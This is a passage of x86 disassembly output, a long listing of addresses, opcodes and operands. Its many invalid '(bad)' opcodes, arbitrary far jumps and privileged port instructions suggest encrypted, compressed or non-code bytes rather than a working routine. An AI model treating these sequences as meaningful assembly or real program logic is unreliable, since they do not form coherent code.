  411fd3:	pop    ebp
  411fd4:	adc    al,0x6d
  411fd6:	add    edx,ebx
  411fd8:	lock es cld 
  411fdb:	mov    edi,DWORD PTR [edx]
  411fdd:	sub    ecx,DWORD PTR [ebx-0x2b]
  411fe0:	adc    al,0x9
  411fe2:	jp     0x412041
  411fe4:	lods   al,BYTE PTR ds:[esi]
  411fe5:	sub    al,0x8f
  411fe7:	ja     0x41202f
  411fe9:	std    
  411fea:	or     bh,BYTE PTR [esi-0xd9df5d2]
  411ff0:	clc    
  411ff1:	shl    DWORD PTR [edi+edx*4-0x4dfb84ec],0xff
  411ff9:	jp     0x412059
  411ffb:	xlat   BYTE PTR ds:[ebx]
  411ffc:	mov    dl,0x4d
  411ffe:	dec    eax
  411fff:	cmp    esp,edx
  412001:	cmp    cl,BYTE PTR [ecx-0x21]
  412004:	and    ebp,0xfffffff0
  412007:	inc    edx
  412008:	dec    ebx
  412009:	pop    ss
  41200a:	xchg   ebx,eax
  41200b:	loopne 0x41205f
  41200d:	push   0xd7114d99
  412012:	and    esi,eax
  412014:	xor    DWORD PTR [esi+0x43c4872c],eax
  41201a:	test   DWORD PTR [ebx],ebp
  41201c:	repnz neg BYTE PTR [eax]
  41201f:	and    al,0xa7
  412021:	xor    al,0xf7
  412023:	arpl   WORD PTR [edi],di
  412025:	cmp    eax,0xcb72b405
  41202a:	cmc    
  41202b:	retf   0xa52d
  41202e:	adc    DWORD PTR [ecx+0xc02d8f4],0x446607d6
  412038:	pop    edi
  412039:	xchg   ecx,eax
  41203a:	jg     0x41202a
  41203c:	push   ds
  41203d:	xor    DWORD PTR [ebp-0x6ce45ac3],edi
  412043:	pop    ebp
  412044:	lods   eax,DWORD PTR ds:[esi]
  412045:	pop    eax
  412046:	mov    DWORD PTR [ebp+0x19],esp
  412049:	sbb    BYTE PTR [ecx+ecx*2],ah
  41204c:	mov    ecx,0x5f7a3a9
  412051:	fcom   QWORD PTR [ecx-0x6672d335]
  412057:	scas   eax,DWORD PTR es:[edi]
  412058:	mov    ebx,0xad200e78
  41205d:	jbe    0x412067
  41205f:	shl    dh,1
  412061:	add    al,0x46
  412063:	cld    
  412064:	mov    DWORD PTR [edi+0x75],eax
  412067:	jge    0x412019
  412069:	pop    ebp
  41206a:	dec    ecx
  41206b:	push   eax
  41206c:	sar    DWORD PTR [edx+0x7c05b6f8],0x30
  412073:	pop    esp
  412074:	div    esi
  412076:	xor    edx,DWORD PTR [edi+0x43]
  412079:	jne    0x41203c
  41207b:	loop   0x412014
  41207d:	call   0xe8de50
  412082:	sub    al,0xbd
  412084:	xchg   ebx,eax
  412085:	and    eax,0x9036aca
  41208a:	push   ds
  41208b:	jno    0x4120ef
  41208d:	sub    eax,0x2c025469
  412092:	(bad)  
  412093:	jne    0x41210c
  412095:	fsub   st(0),st
  412097:	fcomi  st,st(1)
  412099:	add    dh,dh
  41209b:	adc    DWORD PTR [ebx+eax*1],esp
  41209e:	out    0xeb,al
  4120a0:	(bad)  
  4120a1:	push   ecx
  4120a2:	jnp    0x412088
  4120a4:	pop    es
  4120a5:	inc    ebp
  4120a6:	nop
  4120a7:	test   eax,0xcc6ab992
  4120ac:	and    eax,0x1a72625
  4120b1:	scas   eax,DWORD PTR es:[edi]
  4120b2:	sbb    al,BYTE PTR [edx-0x4ee546a2]
  4120b8:	out    0x4,eax
  4120ba:	adc    al,ah
  4120bc:	test   esi,edx
  4120be:	xchg   ebp,eax
  4120bf:	cs jl  0x41207f
  4120c2:	cmp    al,0x43
  4120c4:	pop    ds
  4120c5:	repz lahf 
  4120c7:	test   eax,0x27b84114
  4120cc:	jg     0x412085
  4120ce:	sahf   
  4120cf:	jmp    0xcfa6:0x7630e3b6
  4120d6:	adc    al,BYTE PTR [eax+ebx*2]
  4120d9:	mov    al,ds:0xc493f29
  4120de:	add    DWORD PTR [esi+edi*1-0x3a],ecx
  4120e2:	xor    eax,0x352984c4
  4120e7:	ror    DWORD PTR [ebx+0x76],1
  4120ea:	and    edx,DWORD PTR [eax-0x6f]
  4120ed:	jnp    0x4120e2
  4120ef:	pop    eax
  4120f0:	mov    ebx,edx
  4120f2:	inc    ebx
  4120f3:	lds    eax,FWORD PTR [edi-0xc]
  4120f6:	jle    0x41209f
  4120f8:	gs in  al,dx
  4120fa:	lea    esp,[ebp+0x46dfa9a7]
  412100:	cwde   
  412101:	and    eax,0x9548d381
  412106:	jl     0x412140
  412108:	xor    DWORD PTR [edx],esp
  41210a:	mov    dh,0x2a
  41210c:	rcl    ecx,0x33
  41210f:	xchg   ecx,eax
  412110:	mov    ecx,0x595edae5
  412115:	test   al,0xda
  412117:	or     eax,0x34e8f80e
  41211c:	call   0xd8afd794
  412121:	ror    dh,1
  412123:	test   DWORD PTR [ecx+ebx*1-0x1a22cde0],ecx
  41212a:	xor    edi,ebx
  41212c:	pop    es
  41212d:	std    
  41212e:	loop   0x4120fa
  412130:	pop    eax
  412131:	dec    edx
  412132:	mov    esi,0x8af557e5
  412137:	aad    0xd0
  412139:	loopne 0x41219f
  41213b:	lds    esi,FWORD PTR [ebx-0x72]
  41213e:	mov    bh,0xb4
  412140:	imul   ebx,DWORD PTR [edi-0x42fe789],0x3d
  412147:	sub    dl,BYTE PTR [edi]
  412149:	(bad)  
  41214a:	mov    bh,0xd2
  41214c:	xor    ebp,edx
  41214e:	sti    
  41214f:	or     eax,0xb8f92551
  412154:	arpl   cx,sp
  412156:	push   esi
  412157:	pop    ss
  412158:	icebp  
  412159:	enter  0xbb52,0xfc
  41215d:	aam    0xdc
  41215f:	adc    DWORD PTR [eax-0x8],esp
  412162:	push   ebx
  412163:	push   es
  412164:	inc    ecx
  412165:	mov    WORD PTR [edi],ss
  412167:	ficom  DWORD PTR [edi]
  412169:	dec    ecx
  41216a:	aas    
  41216b:	or     ebp,DWORD PTR [edx-0x6e39d207]
  412171:	add    al,0x68
  412173:	mov    cl,BYTE PTR [ebx+0x20324fc]
  412179:	push   ecx
  41217a:	mov    BYTE PTR ss:[esi+0x61],dh
  41217e:	addr16 pop edi
  412180:	cmp    eax,0xb07f5645
  412185:	push   0x1d
  412187:	mov    dl,0xf2
  412189:	out    dx,al
  41218a:	pop    ds
  41218b:	dec    ebp
  41218c:	jmp    0x41216e
  41218e:	(bad)  
  41218f:	(bad)
  412193:	jo     0x4121a5
  412195:	mov    eax,0xe68ed8eb
  41219a:	sbb    bh,bh
  41219c:	or     bh,BYTE PTR [ebx]
  41219e:	mov    esp,DWORD PTR [ebx+0x55]
  4121a1:	ds push ss
  4121a3:	loopne 0x4121f5
  4121a5:	pop    eax
  4121a6:	or     al,0x9
  4121a8:	mov    ds:0x3980f95a,eax
  4121ad:	shl    DWORD PTR ds:0x78010c66,1
  4121b3:	or     ah,BYTE PTR [edx+0x27]
  4121b6:	sbb    edi,DWORD PTR [ecx]
  4121b8:	jbe    0x41218c
  4121ba:	aas    
  4121bb:	hlt    
  4121bc:	sbb    esi,ebx
  4121be:	pusha  
  4121bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121c0:	mov    al,ds:0x2bc46a6e
  4121c5:	dec    ebx
  4121c6:	int3   
  4121c7:	ins    BYTE PTR es:[edi],dx
  4121c8:	mov    esp,0xa1f2037a
  4121cd:	sub    eax,0xd695646a
  4121d2:	mov    bl,BYTE PTR [eax+0x57]
  4121d5:	lds    edx,FWORD PTR [ecx]
  4121d7:	in     al,dx
  4121d8:	ror    DWORD PTR [ecx+0x60],1
  4121db:	iret   
  4121dc:	popf   
  4121dd:	fbld   TBYTE PTR [edx-0x335aa8e9]
  4121e3:	inc    esi
  4121e4:	mov    ebp,0xb71b84b8
  4121e9:	int3   
  4121ea:	jp     0x4121dc
  4121ec:	ja     0x412229
  4121ee:	dec    ecx
  4121ef:	mov    dl,0x4d
  4121f1:	ret    
  4121f2:	in     eax,0x7f
  4121f4:	sbb    DWORD PTR [ecx-0x48],esi
  4121f7:	enter  0xf4d0,0x4e
  4121fb:	ss (bad) 
  4121fd:	cli    
  4121fe:	xchg   edi,eax
  4121ff:	mov    al,BYTE PTR [ecx]
  412201:	pushf  
  412202:	push   eax
  412203:	int    0xe1
  412205:	mov    ebp,0xca4e33aa
  41220a:	mov    dh,0xde
  41220c:	jb     0x412259
  41220e:	push   0x21b63316
  412213:	cmp    bl,BYTE PTR [esi+0x29d96d3b]
  412219:	data16 mov ?,WORD PTR [ebx-0x6007931b]
  412220:	in     al,dx
  412221:	dec    edi
  412222:	adc    bl,BYTE PTR [edx-0x9]
  412225:	push   es
  412226:	inc    eax
  412227:	in     eax,dx
  412228:	adc    DWORD PTR [ebp+0x18],esp
  41222b:	and    DWORD PTR [edx+ecx*1+0x38cf58d9],eax
  412232:	jo     0x412225
  412234:	jne    0x412282
  412236:	push   edi
  412237:	jns    0x4121d1
  412239:	rcr    ch,1
  41223b:	dec    ebx
  41223c:	pop    esi
  41223d:	cmp    DWORD PTR [ebp-0x35],0x1
  412241:	cmp    BYTE PTR [edi+edi*1-0x4c],bh
  412245:	xchg   ebx,eax
  412246:	xchg   ebx,eax
  412247:	xchg   ebp,eax
  412248:	adc    BYTE PTR [ecx+eax*4],dh
  41224b:	mov    edi,0xbd50662f
  412250:	out    dx,al
  412251:	sbb    al,0x77
  412253:	mov    esp,0x16f74e20
  412258:	push   eax
  412259:	or     BYTE PTR [eax],0x6f
  41225c:	mov    ds:0x253862d8,al
  412261:	call   0xf74d:0xbdf8c1b5
  412268:	dec    esi
  412269:	add    BYTE PTR [esi+0x44fc1b91],0x97
  412270:	aas    
  412271:	sbb    al,0x95
  412273:	cmp    eax,0x8a14a960
  412278:	mov    al,ds:0x522a0e07
  41227d:	pop    es
  41227e:	fdivr  QWORD PTR [eax-0x60]
  412281:	les    ebp,FWORD PTR [edi]
  412283:	(bad)  
  412284:	in     eax,dx
  412285:	add    eax,0xb68a58de
  41228a:	sar    eax,cl
  41228c:	sub    BYTE PTR [edx-0x7],bh
  41228f:	mov    al,0x7c
  412291:	mov    al,cl
  412293:	into   
  412294:	lods   al,BYTE PTR ds:[esi]
  412295:	pop    ebp
  412296:	dec    ebp
  412297:	imul   edi,DWORD PTR [edx+0x5a],0xbc320231
  41229e:	mov    edx,0x743845cd
  4122a3:	inc    eax
  4122a4:	pop    ss
  4122a5:	cmp    al,0x5
  4122a7:	in     al,dx
  4122a8:	inc    edx
  4122a9:	mov    BYTE PTR [ebp-0x22],ah
  4122ac:	push   edi
  4122ad:	sbb    eax,0xc4ef806c
  4122b2:	lods   eax,DWORD PTR ds:[esi]
  4122b3:	jecxz  0x41227b
  4122b5:	cmp    al,0x7b
  4122b7:	push   cs
  4122b8:	xor    BYTE PTR [ecx-0x18],cl
  4122bb:	out    dx,al
  4122bc:	add    BYTE PTR [edi-0x7a],al
  4122bf:	in     al,0x31
  4122c1:	xchg   edi,eax
  4122c2:	and    BYTE PTR [edx-0x60481594],ch
  4122c8:	mov    esp,0xa282767
  4122cd:	pop    esp
  4122ce:	and    dl,0x3
  4122d1:	push   eax
  4122d2:	sub    ah,BYTE PTR [ecx+0x13]
  4122d5:	pop    edi
  4122d6:	imul   edx,DWORD PTR [eax-0x6e67d6ad],0x3e
  4122dd:	cmp    eax,DWORD PTR [eax+0x60]
  4122e0:	dec    edx
  4122e1:	push   eax
  4122e2:	inc    eax
  4122e3:	call   0xd21d:0xe05d
  4122e9:	or     BYTE PTR [edx-0xd9b44ef],0x4d
  4122f0:	push   ecx
  4122f1:	aad    0x74
  4122f3:	mov    al,0x38
  4122f5:	jmp    0x119e:0x1b4eb6eb
  4122fc:	xchg   ebx,eax
  4122fd:	(bad)  
  4122ff:	xchg   ebx,eax
  412300:	leave  
  412301:	jmp    0x97cc:0x9228b699
  412308:	mov    ds:0x1b5a5a59,al
  41230d:	jbe    0x41236f
  41230f:	popa   
  412310:	outs   dx,DWORD PTR ds:[esi]
  412311:	inc    DWORD PTR [eax+0x187da8d4]
  412317:	push   ebp
  412318:	xor    al,0xf9
  41231a:	mov    edi,0x509a5216
  41231f:	mov    ebp,0xd224ec4d
  412324:	lods   al,BYTE PTR ds:[esi]
  412325:	cs fwait
  412327:	ja     0x41235a
  412329:	bound  edx,QWORD PTR [edi+esi*8-0x7968dbb1]
  412330:	mov    cl,0xfa
  412332:	push   cs
  412333:	ja     0x412336
  412335:	jge    0x4122f1
  412337:	sub    esi,0xfbb4094e
  41233d:	push   ecx
  41233e:	repnz outs dx,DWORD PTR ds:[esi]
  412340:	jg     0x412393
  412342:	aaa    
  412343:	and    edi,esp
  412345:	pop    ss
  412346:	xor    DWORD PTR [ebp-0x4d4f2f82],edx
  41234c:	aas    
  41234d:	mov    dl,BYTE PTR [eax-0x7e]
  412350:	pop    edi
  412351:	lds    esp,FWORD PTR [eax]
  412353:	xchg   edi,eax
  412354:	cmp    edi,0xdeafbddd
  41235a:	pop    ebx
  41235b:	pushf  
  41235c:	add    bl,BYTE PTR [edx+0x59]
  41235f:	push   ebx
  412360:	test   al,0xe2
  412362:	mov    ecx,0x61535360
  412367:	adc    al,0x57
  412369:	pop    esi
  41236a:	add    dl,BYTE PTR [edi-0x25]
  41236d:	push   ecx
  41236e:	mov    ecx,0xb541d1de
  412373:	mov    bh,0x56
  412375:	ja     0x412362
  412377:	xchg   DWORD PTR [edx-0x62],eax
  41237a:	div    BYTE PTR [ecx+0x1bbb60b0]
  412380:	ds pop ebp
  412382:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412383:	jg     0x412402
  412385:	(bad)  
  412386:	nop
  412387:	adc    ah,BYTE PTR [edx-0x4daf0a0]
  41238d:	outs   dx,DWORD PTR ds:[esi]
  41238e:	je     0x412317
  412390:	(bad)  
  412392:	fdivr  DWORD PTR [edx+0x4c5a0bde]
  412398:	loope  0x41233e
  41239a:	pop    edi
  41239b:	add    al,0xe
  41239d:	mul    BYTE PTR ds:0x7c54c778
  4123a3:	push   ss
  4123a4:	jmp    0x4123b4
  4123a6:	arpl   WORD PTR [ecx],bp
  4123a8:	pop    ebx
  4123a9:	jno    0x4123f8
  4123ab:	jb     0x412381
  4123ad:	sbb    edi,DWORD PTR [ebx+ebp*2]
  4123b0:	dec    ecx
  4123b1:	repz cmc 
  4123b3:	xor    eax,0xf5faf661
  4123b8:	cwde   
  4123b9:	(bad)  
  4123ba:	mov    al,bl
  4123bc:	popf   
  4123bd:	loope  0x41237f
  4123bf:	enter  0x8f4c,0x7e
  4123c3:	scas   al,BYTE PTR es:[edi]
  4123c4:	sub    al,0xd
  4123c6:	mov    eax,0x69bdaee5
  4123cb:	cmp    al,0x51
  4123cd:	pushf  
  4123ce:	lea    edx,[edi-0x6]
  4123d1:	iret   
  4123d2:	pop    esi
  4123d3:	sbb    DWORD PTR [edx+0x27fa6ca3],esi
  4123d9:	dec    eax
  4123da:	scas   al,BYTE PTR es:[edi]
  4123db:	pop    esi
  4123dc:	inc    edx
  4123de:	push   edi
  4123df:	mov    cl,0x5b
  4123e1:	call   0x4dda743d
  4123e6:	dec    ebx
  4123e7:	xor    eax,0xd6f34867
  4123ec:	loope  0x4123a2
  4123ee:	xchg   ebx,eax
  4123ef:	popa   
  4123f0:	js     0x41246d
  4123f2:	push   edi
  4123f3:	xor    BYTE PTR [esi],dl
  4123f5:	loope  0x412449
  4123f7:	je     0x412386
  4123f9:	rcr    DWORD PTR [ebp-0x27],1
  4123fc:	pop    eax
  4123fd:	push   ds
  4123fe:	sub    BYTE PTR [ebp-0x7f],ah
  412401:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412402:	mov    bl,0xa9
  412404:	enter  0x3d76,0x69
  412408:	mov    DWORD PTR [ebx+edx*8-0x675ec305],esi
  41240f:	xchg   edi,eax
  412410:	das    
  412411:	out    dx,eax
  412412:	xor    esi,ebx
  412414:	sbb    eax,0xf6f19867
  412419:	cmp    eax,0x601b307
  41241e:	cmp    DWORD PTR ds:0xe8fd0c92,eax
  412424:	pop    edi
  412425:	add    DWORD PTR [ebp-0xa82ea28],esi
  41242b:	stos   BYTE PTR es:[edi],al
  41242c:	push   cs
  41242d:	jb     0x412480
  41242f:	xor    dh,BYTE PTR [ebx-0x2090d718]
  412435:	add    BYTE PTR [ecx],bl
  412437:	sub    ah,BYTE PTR [edx]
  412439:	push   esp
  41243a:	into   
  41243b:	push   edx
  41243c:	retf   0xe3b
  41243f:	or     bh,BYTE PTR [ecx]
  412441:	ins    DWORD PTR es:[edi],dx
  412442:	push   esi
  412443:	mov    eax,ds:0x1505278a
  412448:	cmp    DWORD PTR [ebp-0x18],esp
  41244b:	out    0xd2,eax
  41244d:	imul   esp
  41244f:	xor    cl,BYTE PTR ds:0x81b71552
  412455:	jg     0x4123f3
  412457:	ror    edx,cl
  412459:	aam    0x52
  41245b:	je     0x41249f
  41245d:	neg    BYTE PTR [edx]
  41245f:	inc    esp
  412460:	dec    esi
  412461:	mov    BYTE PTR [esi-0x3d4617e3],dh
  412467:	sub    al,0xea
  412469:	popa   
  41246a:	adc    DWORD PTR [esi+0x4c],edx
  41246d:	cmp    dh,BYTE PTR [eax]
  41246f:	pusha  
  412470:	into   
  412471:	sbb    bl,al
  412473:	dec    ecx
  412474:	out    dx,eax
  412475:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412476:	jecxz  0x4124eb
  412478:	jmp    0xb059:0xc1e04ffa
  41247f:	or     edi,DWORD PTR [eax+ecx*2+0x5e]
  412483:	xchg   ebp,eax
  412484:	data16 sbb al,0x3e
  412487:	shl    DWORD PTR [eax+0x6a],0xab
  41248b:	daa    
  41248c:	das    
  41248d:	js     0x412500
  41248f:	(bad)  
  412490:	gs enter 0x4845,0xd1
  412495:	bswap  edx
  412497:	sbb    eax,0xde75ec32
  41249c:	xchg   edi,eax
  41249d:	lea    eax,[ecx+0x5c]
  4124a0:	in     eax,0x1b
  4124a2:	xchg   ebp,eax
  4124a3:	and    ebp,eax
  4124a5:	lods   al,BYTE PTR ds:[esi]
  4124a6:	add    DWORD PTR [edx],esp
  4124a8:	add    al,0xaa
  4124aa:	inc    edi
  4124ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124ac:	mov    eax,0x31d4391b
  4124b1:	sbb    BYTE PTR [ebx],dl
  4124b3:	mov    edx,DWORD PTR [esi+0x51]
  4124b6:	(bad)  
  4124b7:	loopne 0x41249a
  4124b9:	cld    
  4124ba:	xor    BYTE PTR [ecx+eax*2-0x1b1742e3],0x1d
  4124c2:	sub    eax,0x293f32cb
  4124c7:	jp     0x412466
  4124c9:	jmp    0x412488
  4124cb:	inc    eax
  4124cc:	mov    eax,DWORD PTR [eax+0x668a936a]
  4124d2:	mov    bh,0x4a
  4124d4:	daa    
  4124d5:	ins    DWORD PTR es:[edi],dx
  4124d6:	mov    ds:0xc38bb020,al
  4124db:	popa   
  4124dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124dd:	fild   QWORD PTR [ebp+0xc]
  4124e0:	das    
  4124e1:	adc    DWORD PTR [edi-0x2c0fb65e],0xf49b6db3
  4124eb:	pusha  
  4124ec:	std    
  4124ed:	leave  
  4124ee:	push   ds
  4124ef:	iret   
  4124f0:	mov    dh,0x8a
  4124f2:	into   
  4124f3:	repz aas 
  4124f5:	push   edi
  4124f6:	cmp    dl,al
  4124f8:	mov    ah,0xcc
  4124fa:	jne    0x4124e4
  4124fc:	stos   BYTE PTR es:[edi],al
  4124fd:	clc    
  4124fe:	out    dx,al
  4124ff:	xchg   ecx,eax
  412500:	ss hlt 
  412502:	jae    0x412569
  412504:	xchg   esp,eax
  412505:	loop   0x41256a
  412507:	push   ds
  412508:	mov    esi,0xbc6c2ca2
  41250d:	sbb    cl,BYTE PTR [edi+edx*2-0x70]
  412511:	pop    ebx
  412512:	mov    BYTE PTR [ebp+0x49],0x9e
  412516:	loope  0x412505
  412518:	and    cl,BYTE PTR [edi+edi*4]
  41251b:	add    eax,0xf4b4ce64
  412520:	push   0x896012c5
  412525:	and    al,0xdc
  412527:	cmp    BYTE PTR [edi+0x2d03ede5],dh
  41252d:	mov    ch,0x32
  41252f:	or     DWORD PTR [edi+0x2c],eax
  412532:	jb     0x412502
  412534:	cld    
  412535:	outs   dx,BYTE PTR ds:[esi]
  412536:	and    al,0xef
  412538:	outs   dx,BYTE PTR ds:[esi]
  412539:	scas   eax,DWORD PTR es:[edi]
  41253a:	test   BYTE PTR [ebx+ebp*8+0x69],ah
  41253e:	cs lock or DWORD PTR ds:[esi],esp
  412543:	loopne 0x412560
  412545:	je     0x41258e
  412547:	jb     0x4125af
  412549:	jmp    0x1c43:0x7ab18096
  412550:	sbb    eax,DWORD PTR [edi-0x1fc018d9]
  412556:	sbb    al,0xb1
  412558:	jl     0x41251c
  41255a:	out    0xfc,eax
  41255c:	inc    esp
  41255d:	add    eax,0xab002cbf
  412562:	or     edx,ebx
  412564:	test   al,0xd
  412566:	(bad)  
  412567:	pop    ds
  412568:	adc    edx,DWORD PTR ds:0x9cb56614
  41256e:	loope  0x412515
  412570:	jne    0x412574
  412572:	in     al,0x2d
  412574:	mov    DWORD PTR [ebx-0x780b2a98],esp
  41257a:	mov    edx,0x24e2c4a1
  41257f:	adc    al,0xc1
  412581:	add    esp,esi
  412583:	aad    0x49
  412585:	and    al,0x49
  412587:	xchg   ebx,eax
  412588:	mov    WORD PTR [edi+0xefc7990],es
  41258e:	jo     0x4125b7
  412590:	ins    BYTE PTR es:[edi],dx
  412591:	div    BYTE PTR [esi]
  412593:	lods   eax,DWORD PTR ds:[esi]
  412594:	sub    cl,BYTE PTR [eax+ecx*4-0x67]
  412598:	cmc    
  412599:	sbb    cl,BYTE PTR [ebp-0x41]
  41259c:	shr    BYTE PTR [edi-0x35],cl
  41259f:	jl     0x412532
  4125a1:	mov    edi,0x1c6bbdd1
  4125a6:	test   al,0xd3
  4125a8:	cdq    
  4125a9:	fnstenv [edx-0x4ddab888]
  4125af:	sub    bl,ah
  4125b1:	sub    dl,BYTE PTR [esi+0xe]
  4125b4:	jmp    0xb1f2:0xfb0ddc7c
  4125bb:	leave  
  4125bc:	out    0x64,al
  4125be:	outs   dx,BYTE PTR ds:[esi]
  4125bf:	mov    BYTE PTR [esi],bh
  4125c1:	mov    ecx,0xe492f20f
  4125c6:	or     edi,esp
  4125c8:	test   al,0xb9
  4125ca:	neg    DWORD PTR [edx]
  4125cc:	xchg   BYTE PTR ds:0xf87896a1,dh
  4125d2:	xor    al,BYTE PTR [ebp+esi*8+0x420a80be]
  4125d9:	fwait
  4125da:	mov    dh,0x69
  4125dc:	in     al,0x6d
  4125de:	mov    ch,0xad
  4125e0:	mov    bl,0xcb
  4125e2:	pop    esp
  4125e3:	test   eax,0xcbbfa462
  4125e8:	in     al,0x6d
  4125ea:	call   FWORD PTR [ecx-0x4aa57c1f]
  4125f0:	or     BYTE PTR [eax],dl
  4125f2:	inc    esp
  4125f3:	ret    
  4125f4:	hlt    
  4125f5:	add    al,bh
  4125f7:	xchg   ch,ch
  4125f9:	jns    0x412636
  4125fb:	aad    0x9
  4125fd:	cli    
  4125fe:	jg     0x412626
  412600:	ins    BYTE PTR es:[edi],dx
  412601:	sub    DWORD PTR [esi],edx
  412603:	stc    
  412604:	retf   0x80d5
  412607:	pop    esi
  412608:	fwait
  412609:	mov    dl,0xf5
  41260b:	inc    esi
  41260c:	push   ds
  41260d:	arpl   WORD PTR [eax+0x52848d52],di
  412613:	rcl    DWORD PTR [edx+0x4802cb3d],1
  412619:	mov    cl,0xf8
  41261b:	adc    DWORD PTR [edi],esi
  41261d:	clc    
  41261e:	dec    ebx
  41261f:	sub    BYTE PTR [ebx],ah
  412621:	jg     0x41266d
  412623:	adc    al,0x5f
  412625:	(bad)  
  412626:	jb     0x4125f2
  412628:	sbb    eax,0x2ea3a5eb
  41262d:	je     0x412644
  41262f:	loope  0x41263e
  412631:	jg     0x41264f
  412633:	jns    0x4125de
  412635:	inc    ebx
  412636:	sbb    esi,DWORD PTR [eax-0x735b9409]
  41263c:	xchg   esi,eax
  41263d:	lods   al,BYTE PTR ds:[esi]
  41263e:	out    0x30,al
  412640:	stos   DWORD PTR es:[edi],eax
  412641:	imul   DWORD PTR [edx-0x3d93c522]
  412647:	(bad)  
  412648:	(bad)  
  412649:	cmp    al,0xd7
  41264b:	das    
  41264c:	stc    
  41264d:	jmp    0x70930f20
  412652:	nop
  412653:	loop   0x4125d8
  412655:	jo     0x4126a5
  412657:	leave  
  412658:	inc    esp
  412659:	repz popf 
  41265b:	loop   0x4125e9
  41265d:	sbb    ebp,DWORD PTR [ebp+0x25ef00de]
  412663:	sub    dh,dh
  412665:	retf   
  412666:	loop   0x41261c
  412668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412669:	push   ss
  41266a:	xor    dh,bh
  41266c:	cmp    al,0x28
  41266e:	and    al,0xdc
  412670:	xchg   esi,eax
  412671:	sbb    BYTE PTR [ebp+0x61c5d42a],0xa7
  412678:	adc    cl,BYTE PTR [esp+ebx*4+0x55]
  41267c:	retf   
  41267d:	sbb    DWORD PTR [edx+0x551b3e57],esp
  412683:	leave  
  412684:	fadd   QWORD PTR [ebp+0x4bea3a1]
  41268a:	mov    eax,0xbc668c3f
  41268f:	shr    DWORD PTR [ecx],0x2
  412692:	xchg   edi,eax
  412693:	mov    ch,0xe0
  412695:	mov    cl,0x2e
  412697:	pop    es
  412698:	xchg   edx,eax
  412699:	data16 add BYTE PTR [esp+ebp*8],dl
  41269d:	inc    ebx
  41269e:	mov    DWORD PTR ds:0x4864c101,0x88b37691
  4126a8:	cmp    eax,0xfb3e3dd8
  4126ad:	(bad)  
  4126ae:	push   ecx
  4126af:	lods   al,BYTE PTR ds:[esi]
  4126b0:	es stc 
  4126b2:	xlat   BYTE PTR ds:[ebx]
  4126b3:	cmp    DWORD PTR [ebp+0x7d39c533],ecx
  4126b9:	push   cs
  4126ba:	mov    ds:0x260df723,eax
  4126bf:	mov    ebx,0x55f6518c
  4126c4:	jmp    0x4126be
  4126c6:	retf   0x883b
  4126c9:	jmp    0x72c9e88f
  4126ce:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126d0:	dec    ebx
  4126d1:	xchg   edx,eax
  4126d2:	test   BYTE PTR [edx],bl
  4126d4:	data16 mov bl,0xf5
  4126d7:	cs jne 0x41270c
  4126da:	test   edi,ebx
  4126dc:	cmp    eax,0xae02b67c
  4126e1:	mov    edi,0xe18ae248
  4126e6:	pop    ebx
  4126e7:	mov    ds:0xce06c606,al
  4126ec:	(bad)  
  4126ee:	dec    ebx
  4126ef:	adc    al,0xff
  4126f1:	mov    bh,0xd5
  4126f3:	shl    DWORD PTR ds:0xbf03eb9f,0xcf
  4126fa:	push   cs
  4126fb:	call   0xdea5e364
  412700:	add    dl,bl
  412702:	lods   al,BYTE PTR ds:[esi]
  412703:	mov    dh,0x72
  412705:	lock mov esp,DWORD PTR [eax+eax*8-0x6e]
  41270a:	fs cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41270d:	lahf   
  41270e:	in     al,dx
  41270f:	jnp    0x4126f4
  412711:	and    BYTE PTR [eax],al
  412713:	ror    ch,cl
  412715:	and    esi,DWORD PTR [esi]
  412717:	mov    ecx,0xbcfe00e3
  41271c:	cmp    al,0x91
  41271e:	call   eax
  412720:	xchg   esp,eax
  412721:	adc    DWORD PTR [ecx+0x64a8a574],esi
  412727:	mov    ebp,0x240aadd
  41272c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41272d:	jmp    0x4126f9
  41272f:	aaa    
  412730:	xchg   DWORD PTR [ecx+ebx*8+0x6d],esi
  412734:	pop    edx
  412735:	fstp   QWORD PTR [edx]
  412737:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412738:	or     dh,bh
  41273a:	es (bad) 
  41273c:	sahf   
  41273d:	into   
  41273e:	adc    DWORD PTR [ecx],0x18b866db
  412744:	jne    0x412744
  412746:	lods   eax,DWORD PTR ds:[esi]
  412747:	push   0x37
  412749:	xchg   edi,eax
  41274a:	aam    0xc1
  41274c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41274d:	ins    DWORD PTR es:[edi],dx
  41274e:	dec    edi
  41274f:	or     al,0xe1
  412751:	daa    
  412752:	les    ebp,FWORD PTR [esi+ebp*2]
  412755:	cdq    
  412756:	sub    eax,0x1d2e95a2
  41275b:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41275d:	jmp    0xf69fb7cd
  412762:	sub    BYTE PTR ds:0xfbbe59fc,cl
  412768:	push   ebp
  412769:	sbb    esp,DWORD PTR [edi+0x1e]
  41276c:	add    BYTE PTR [edi+0x40555120],bh
  412772:	retf   0x4f1f
  412775:	fwait
  412776:	sbb    ch,bl
  412778:	lods   eax,DWORD PTR ds:[esi]
  412779:	mov    eax,0x612694c3
  41277e:	fs or  eax,0xe3112ed2
  412784:	jecxz  0x41274f
  412786:	out    0x68,al
  412788:	mov    ebx,0x9e2e3ee
  41278d:	xchg   edi,eax
  41278e:	push   eax
  41278f:	hlt    
  412790:	or     al,0x55
  412792:	cmp    cl,BYTE PTR [ecx]
  412794:	add    bh,BYTE PTR [ebp-0x1d8eb102]
  41279a:	data16 (bad) 
  41279c:	mov    ch,BYTE PTR ss:[ebx+ebx*2]
  4127a0:	mov    bl,0xb2
  4127a2:	fistp  WORD PTR [edi]
  4127a4:	xor    BYTE PTR [eax+0x19],al
  4127a7:	mov    ds:0x4ec64db4,eax
  4127ac:	jno    0x412746
  4127ae:	sti    
  4127af:	dec    eax
  4127b0:	add    al,0xff
  4127b2:	pop    esi
  4127b3:	jnp    0x412771
  4127b5:	add    eax,0x96c9f753
  4127ba:	xchg   edi,eax
